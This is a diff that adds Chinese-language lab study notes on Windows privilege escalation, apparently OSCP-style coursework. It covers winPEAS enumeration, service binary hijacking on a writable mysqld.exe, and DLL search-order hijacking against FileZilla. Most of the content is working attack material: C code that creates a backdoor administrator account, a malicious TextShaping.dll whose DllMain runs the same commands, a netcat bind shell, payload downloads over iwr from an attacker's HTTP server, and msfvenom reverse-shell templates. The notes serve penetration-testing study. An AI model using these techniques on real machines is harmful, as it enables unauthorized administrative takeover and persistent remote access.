@@ -1155,4 +1155,425 @@ clientwk220\daveadmin
 ![image](https://hackmd.io/_uploads/ByizT6bcJg.png)
 
 ### Automated Enumeration
+#### 1. Windows 自動化提權工具: [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
+在 Kali Linux 上安裝 peass 套件，可透過 Python Web 伺服器 將 winPEAS 提供給 Windows 目標機器執行。
+```
+┌──(chw㉿CHW)-[~]
+└─$ sudo apt update
+sudo apt install -y peass
+[sudo] password for chw: 
+...
+┌──(chw㉿CHW)-[~]
+└─$ cp /usr/share/peass/winpeas/winPEASx64.exe .
+
+┌──(chw㉿CHW)-[~]
+└─$ python3 -m http.server 80           
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) 
+|
+```
+接著 nc bind shell 到目標機器
+```
+┌──(chw㉿CHW)-[~]
+└─$ nc 192.168.170.220 4444
+Microsoft Windows [Version 10.0.22621.1555]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\dave>powershell
+powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Users\dave> iwr -uri http://192.168.45.186/winPEASx64.exe -Outfile winPEAS.exe  
+iwr -uri http://192.168.45.186/winPEASx64.exe -Outfile winPEAS.exe
+```
+> 使用 `Invoke-WebRequest` (iwr 的縮寫) 遠端伺服器下載 winPEASx64.exe
+
+最後執行 winPEASx64
+```
+PS C:\Users\dave> .\winPEAS.exe
+```
+(Users output section)\
+![image](https://hackmd.io/_uploads/B1yVQiVckl.png)
+
+#### 2. [Seatbelt](https://github.com/GhostPack/Seatbelt)
+GhostPack-Compiled Binaries: [r3motecontrol/Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries?utm_source=chatgpt.com)
+
+## Leveraging Windows Services
+[Windows Service](https://learn.microsoft.com/en-us/dotnet/framework/windows-services/introduction-to-windows-service-applications) 由 [Service Control Manager](https://learn.microsoft.com/en-us/windows/win32/services/service-control-manager) 負責管理背景程式或應用程式，類似 Unix 的 [daemons](https://en.wikipedia.org/wiki/Daemon_(computing))。\
+Windows services 可以透過 Services snap-in, PowerShell 或  sc.exe command line tool
+
+### Service Binary Hijacking
+每個 Windows Services 都有對應的 Binary File，在可執行檔權限配置不當時，低權限的使用者可能可以修改或替換這個二進位檔。\
+開發人員安裝了一個 application 作為 Windows 服務。安裝時，該應用程式的權限配置錯誤，允許 Users group 擁有 R-W 權限。\
+顯示 Windows services:
+- GUI snap-in services.msc
+- Get-Service Cmdlet
+- Get-CimInstance Cmdlet (superseding Get-WmiObject)
+
+>[!Caution]
+> 當使用 network logon（例如 WinRM 或 bind shell）時，`Get-CimInstance` 和 `Get-Service` 在使用非管理員權限查詢服務時會導致 "permission denied" 。使用 RDP 登入可以解決此問題。
+
+#### 1. Get-CimInstance 查詢 WMI 
+使用 Get-CimInstance 來查詢 WMI class [win32_service](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-classes) (win32_service class 包含所有 Windows 服務的資訊)，查看 Name, State, and PathName，並使用 `Where-Object` 過濾掉任何未運作狀態的服務
+```
+PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+
+Name                      State   PathName
+----                      -----   --------
+Apache2.4                 Running "C:\xampp\apache\bin\httpd.exe" -k runservice
+Appinfo                   Running C:\Windows\system32\svchost.exe -k netsvcs -p
+AppXSvc                   Running C:\Windows\system32\svchost.exe -k wsappx -p
+AudioEndpointBuilder      Running C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
+Audiosrv                  Running C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
+BFE                       Running C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p
+BITS                      Running C:\Windows\System32\svchost.exe -k netsvcs -p
+BrokerInfrastructure      Running C:\Windows\system32\svchost.exe -k DcomLaunch -p
+...
+mysql                     Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
+...
+```
+> `Get-CimInstance`：查詢 Windows Management Instrumentation（WMI）\
+> `{$_.State -like 'Running'}`: 
+>- `$_`: 代表 pipeline 傳遞的每個物件（即每個 Windows 服務）
+>- `$.State` 指的是服務的狀態
+>- `like 'Running'`：只顯示 State 欄位 "Running" 的服務
+
+兩個 XAMPP 服務的 Apache2.4 and mysql，路徑位置在 `C:\xampp\ ` 而非 `C:\Windows\System32`，代表是 user 自己安裝的
+
+#### 2. enumerate service binaries 的權限
+兩種工具:
+- [icacls](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)（Windows 內建工具，可在 PowerShell 和 cmd 中使用）。
+![image](https://hackmd.io/_uploads/Hyz5a5r9Jl.png)
+
+- [Get-ACL](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7.2)（PowerShell Cmdlet）
+
+使用 icacls 查看 httpd.exe 與 mysqld.exe
+```
+PS C:\Users\dave> icacls "C:\xampp\apache\bin\httpd.exe"
+C:\xampp\apache\bin\httpd.exe BUILTIN\Administrators:(F)
+                              NT AUTHORITY\SYSTEM:(F)
+                              BUILTIN\Users:(RX)
+                              NT AUTHORITY\Authenticated Users:(RX)
+
+Successfully processed 1 files; Failed processing 0 files
+
+PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe"
+C:\xampp\mysql\bin\mysqld.exe NT AUTHORITY\SYSTEM:(F)
+                              BUILTIN\Administrators:(F)
+                              BUILTIN\Users:(F)
+
+Successfully processed 1 files; Failed processing 0 files
+```
+> `httpd.exe`: dave 只有 RX，不能寫入\
+> `mysqld.exe`: dave 有 Full Access (F) permission
+
+#### 3. 建立 binary 並 Cross-Compilation
+在 kali 上建立 small binary，來取代 mysqld.exe\
+用 C code 創建新的 user，利用 system() 將 user 加入 Administrators group
+adduser.c
+```c
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user dave2 password123! /add");
+  i = system ("net localgroup administrators dave2 /add");
+  
+  return 0;
+}
+```
+
+接著 利用 mingw-64 Cross-Compilation 成 exe file
+(目標機器為 64-bit)
+```
+┌──(chw㉿CHW)-[~]
+└─$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+
+┌──(chw㉿CHW)-[~]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+```
+#### 4. 將 compiled EXE 取代 original exe
+```
+PS C:\Users\dave> iwr -uri http://192.168.45.188/adduser.exe -Outfile adduser.exe                            PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
+PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
+PS C:\Users\dave>
+```
+> `mysqld.exe` 備份到當前目錄，再將 `adduser.exe` 匯入
+
+重啟服務
+```
+PS C:\Users\dave> net stop mysql
+System error 5 has occurred.
+
+Access is denied.
+```
+> dave 沒有權限重啟
+
+>[!Tip]
+>If the service Startup Type is set to "Automatic", we may be able to restart the service by rebooting the machine.
+
+可使用 `Get-CimInstance` 查看 Name and StartMode
+```
+Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
+```
+確認 dave 系統權限:
+```
+PS C:\Users\dave> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State
+============================= ==================================== ========
+SeSecurityPrivilege           Manage auditing and security log     Disabled
+SeShutdownPrivilege           Shut down the system                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+SeUndockPrivilege             Remove computer from docking station Disabled
+...
+```
+> Shut down the system: Disabled
+>> 未使用 SeShutdownPrivilege 權限
+
+嘗試使用 shutdown
+```
+shutdown /r /t 0
+```
+
+#### 5. 重啟服務後，使用 msfvenom 建立 reverse shell
+確認 adduser.exe 是否成功覆蓋 mysqld.exe
+```
+PS C:\Users\dave> Get-LocalGroupMember administrators
+
+ObjectClass Name                      PrincipalSource
+----------- ----                      ---------------
+User        CLIENTWK220\Administrator Local
+User        CLIENTWK220\BackupAdmin   Local
+User        CLIENTWK220\dave2         Local
+User        CLIENTWK220\daveadmin     Local
+User        CLIENTWK220\offsec        Local
+```
+> dave2 成功新增
+
+執行 interactive shell. 兩種方法
+##### (1) Runas
+(可參考 [本章 #Hidden-in-Plain-View 3.](#Hidden-in-Plain-View))\
+```
+PS C:\Users\dave> runas /user:dave2 cmd
+```
+![image](https://hackmd.io/_uploads/ryrPojScye.png)
+
+##### (2) msfvenom
+使用 [msfvenom](https://www.offsec.com/metasploit-unleashed/msfvenom/) 新增 executable file 執行 reverse shell
+ 
+>[!Important]
+> msfvenom 範例：\
+>`msfvenom -p <PAYLOAD> -f <FORMAT> -o <輸出檔案> <選項>`
+> - Windows reverse shell:\
+> `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o chw.exe`
+> - Linux reverse shell:\
+> `msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o chw.elf`
+> - PHP reverse Shell:\
+> `msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > chw.php`
+> - PowerShell code:\
+> `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f psh > chw.ps1`
+> - Base64 encode PowerShell code:\
+> `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f psh-cmd`
+
+### DLL Hijacking
+若沒有權限來取代這些 Binary File ...\
+Windows 上的 [Dynamic Link Libraries](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library)(DLL) 是一種提供特定功能的可共享程式碼庫，類似 Unix 的 [Shared Object](https://docs.oracle.com/cd/E19120-01/open.solaris/819-0690/6n33n7f8u/index.html) (.so)\
+#### 1. 覆蓋二進位檔
+但若不能覆蓋 `.exe`，可覆蓋 `.dll`。
+#### 2. [DLL Search Order](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order) Hijacking 載入順序
+Windows 會依照特定的順序搜尋 DLL，如果 attacker 在某個優先目錄中放入惡意 DLL，程式可能會先載入惡意 DLL\
+Windows 預設開啟了 Safe DLL Search Mode，讓 DLL Hijacking 變得比較困難，但仍然可以找到可利用的漏洞。
+
+>[!Tip]
+>search order from [Microsoft Documentation](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order):
+>1. The directory from which the application loaded.
+>2. The system directory.
+>3. The 16-bit system directory.
+>4. The Windows directory. 
+>5. The current directory.
+>6. The directories that are listed in the PATH environment variable.
+
+以下範例使用 abuse missing DLL
+```
+PS C:\Users\steve> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+
+displayname
+-----------
+
+FileZilla 3.63.1
+KeePass Password Safe 2.51.1
+Microsoft Edge
+Microsoft Edge Update
+Microsoft Edge WebView2 Runtime
+
+Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.28.29913
+Microsoft Visual C++ 2019 X86 Additional Runtime - 14.28.29913
+Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.28.29913
+Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.28.29913
+```
+> `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"` 列出安裝在 Windows 系統上的 32-bit application (前面有講解過)
+>> ileZilla FTP Client application: ver.3.63.1
+
+查詢 [DLL hijacking vulnerability](https://filezilla-project.org/):\
+當 application 啟動時，會嘗試從 installation directory 中 load `TextShaping.dll`，如果能夠成功將 malicious DLL 注入，當有 user 執行 FileZilla FTP Client， malicious DLL 就會被載入
+
+##### 2.1 檢查 FileZilla directory 權限
+檢查 FileZilla directory 可否寫入
+```
+PS C:\Users\steve> echo "chw" > 'C:\FileZilla\FileZilla FTP Client\chw.txt'
+PS C:\Users\steve> type 'C:\FileZilla\FileZilla FTP Client\chw.txt'
+chw
+```
+> 可寫入。
+
+##### 2.2 Process Monitor 查看 real-time process
+[Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) 可以查看 real-time 的 process, thread, file system, or registry related activities.\
+當找到 DLLs service binary，可以檢查權限，是否能用 malicious DLL 取代。
+
+在本機安裝 [Procmon](https://concurrency.com/blog/procmon-basics/) (在正常 PT 中需要複製 service binary 到 local)
+
+在 `C:\tools\Procmon\Procmon64.exe` 開啟，使用 backupadmin(Administrator group) 登入\
+![image](https://hackmd.io/_uploads/SyGpanHc1e.png)
+
+透過 Filter menu > Filter... 尋找 filezilla.exe 相關的資訊\
+![image](https://hackmd.io/_uploads/HkATJTH51e.png)
+
+CreateFile 除了負責 creating files 還會負責 accessing existing files.\
+可以新增 Filter 條件:
+- only CreateFile operations
+- Path include TextShaping.dll
+
+![image](https://hackmd.io/_uploads/Bkbe76S9kl.png)
+
+![image](https://hackmd.io/_uploads/H1Kr7pS91x.png)
+>在`C:\FileZilla\FileZilla FTP Client\` 載入 DLL，但失敗且NAME NOT FOUND，表示 DLL 根本不存在。隨後又進行了兩次CreateFile操作，其中 DLL 從 System32 加載成功
+
+目標 :flashlight: ：建立一個名為 TextShaping.dll 的 malicious DLL
+
+>[!Note]
+>在 Windows 中，DLL 有一個 entry point function `DllMain`，function 包含四個 cases:
+>- `DLL_PROCESS_ATTACH`: process 載入 DLL 時執行
+>- `DLL_THREAD_ATTACH`: new thread 被創建時執行
+>- `DLL_THREAD_DETACH`: thread 正常退出時執行
+>- `DLL_PROCESS_DETACH`: DLL 被 unloaded 時執行
+>
+>如果 DLL 沒有 DllMain entry point function，它只提供資源。
+>> `DLL_PROCESS_ATTACH` 會被執行，因此現在情況可在這個部分插入惡意程式碼
+
+Microsoft 官方的基本 DllMain code example
+```c
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+```
+
+##### 2.3 Malicious code 撰寫與注入
+加入 include statement 及 system function ，方法與上一節相同，加入 administrator user\
+TextShaping.cpp:
+```c
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user dave3 password123! /add");
+  	    i = system ("net localgroup administrators dave3 /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+```
+編譯 TextShaping.cpp
+```
+┌──(chw㉿CHW)-[~]
+└─$ sudo apt update
+sudo apt install mingw-w64
+...
+┌──(chw㉿CHW)-[~]
+└─$ vi TextShaping.cpp 
+┌──(chw㉿CHW)-[~]
+└─$ x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
+┌──(chw㉿CHW)-[~]
+└─$ python3 -m http.server 80                                         
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+Windows 透過 iwr 接收 TextShaping.dll
+```
+PS C:\Users\steve> iwr -uri http://192.168.45.188/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
+```
+
+steve 是以 normal user 執行 FileZilla，則惡意 DLL 也只會以 normal user 權限運行，無法新增管理員帳戶。需要等待更高權限的 user 運行該應用程式並觸發惡意 DLL 的載入。
+
+##### 2.4 驗證執行成果，獲得高權限 User 
+```
+PS C:\Users\steve> net user
+
+User accounts for \\CLIENTWK220
+
+-------------------------------------------------------------------------------
+Administrator            BackupAdmin              dave
+dave3                    daveadmin                DefaultAccount
+Guest                    offsec                   steve
+WDAGUtilityAccount
+The command completed successfully.
+
+PS C:\Users\steve> net localgroup administrators
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+BackupAdmin
+dave3
+daveadmin
+offsec
+The command completed successfully.
+```
+> dave3 user 成功新增，代表 malicious code 成功執行
+
+```
+PS C:\Users\steve> runas /user:dave3 cmd
+```
+
+### Unquoted Service Paths
 
